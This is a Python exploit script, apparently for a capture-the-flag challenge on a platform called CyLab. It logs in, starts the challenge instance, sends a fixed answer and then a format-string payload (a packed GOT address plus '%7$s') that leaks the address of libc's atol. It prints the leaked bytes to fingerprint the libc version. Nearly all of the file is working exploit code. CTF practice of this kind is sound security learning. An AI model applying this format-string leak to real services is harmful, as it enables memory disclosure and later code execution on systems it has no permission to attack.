import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

ANSWER = -2623
cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/89/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/89/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=20)
s.settimeout(8)
time.sleep(0.4)
try:
    s.recv(8192)
except Exception:
    pass
s.sendall(f"{ANSWER}\n".encode())
time.sleep(0.6)
try:
    s.recv(8192)
except Exception:
    pass
payload = struct.pack("<I", 0x804BFE4) + b"%7$s" + b"\n"
s.sendall(payload)
time.sleep(1.2)
res = b""
try:
    while True:
        c = s.recv(65536)
        if not c:
            break
        res += c
except Exception:
    pass
print("brut:", res[:200])
i = res.find(b"Congrats: ")
if i >= 0:
    raw = res[i + 10:i + 10 + 8]
    print("octets:", raw.hex())
    val = int.from_bytes(raw[:4], "little")
    print("atol libc =", hex(val), "| low12 =", hex(val & 0xfff))
    print("attendu atol offset low12:", hex(0x36820 & 0xfff))
s.close()
